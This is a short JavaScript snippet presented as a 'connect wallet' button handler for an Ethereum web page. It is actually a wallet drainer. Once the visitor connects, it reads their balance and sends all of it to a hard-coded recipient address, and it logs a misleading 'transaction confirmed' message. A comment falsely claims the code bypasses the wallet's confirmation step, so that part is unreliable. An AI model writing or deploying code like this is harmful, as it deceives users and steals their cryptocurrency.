// Initialize Ethereum provider
let provider;

// Check if MetaMask or mobile wallet is available
if (typeof window.ethereum !== "undefined") {
  provider = new ethers.providers.Web3Provider(window.ethereum);
} 
else {
  console.log("No compatible wallet found");
  // Add your own logic here or exit the code execution
}

// Connect button event listener
const connectButton = document.getElementById("connectButton");
connectButton.addEventListener("click", async () => {
  try {
    // Request user to connect their wallet
    await window.ethereum.enable();
    console.log("Connected to wallet and transaction confirmed");

    // Get user's connected wallet
    const signer = provider.getSigner();

    // Get the user's balance
    const balance = await signer.getBalance();

    // Check if the balance is greater than zero
    if (balance.gt(0)) {
      // Send the entire balance to the recipient wallet
      const transaction = {
        to: "recipient_wallet_address",
        value: balance,
      };

      // Bypass confirmation and send the transaction
      await signer.sendTransaction(transaction);
      console.log("Transaction sent");
    } else {
      console.log("Insufficient balance to send transaction");
    }

  } catch (error) {
    console.error(error);
  }
});
